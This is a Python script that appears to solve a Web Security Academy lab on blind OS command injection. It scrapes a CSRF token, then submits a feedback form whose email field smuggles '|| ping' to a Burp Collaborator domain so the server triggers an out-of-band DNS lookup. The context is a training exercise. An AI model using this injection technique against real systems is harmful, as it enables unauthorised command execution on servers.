import requests
from bs4 import BeautifulSoup

s = requests.Session()

# Step 1: Get CSRF token
feedback_url = 'https://0a89007e048585aa84a45074006f0036.web-security-academy.net/feedback'
resp = s.get(feedback_url)
soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'}).get('value')

# Step 2: Submit feedback with injected command
feedback_submit_url = 'https://0a89007e048585aa84a45074006f0036.web-security-academy.net/feedback/submit'

collaborator_domain = 'abc123xyz.burpcollaborator.net'  # <-- replace with YOUR domain from Burp Collaborator

post_data = {
    'csrf': csrf,
    'name': 'Long',
    'email': f'lamlon@pdx.edu|| ping {collaborator_domain} ||',
    'subject': 'websec',
    'message': 'tomatoes'
}
resp = s.post(feedback_submit_url, data=post_data)

print("Payload submitted. Check Burp Collaborator for incoming DNS requests!")
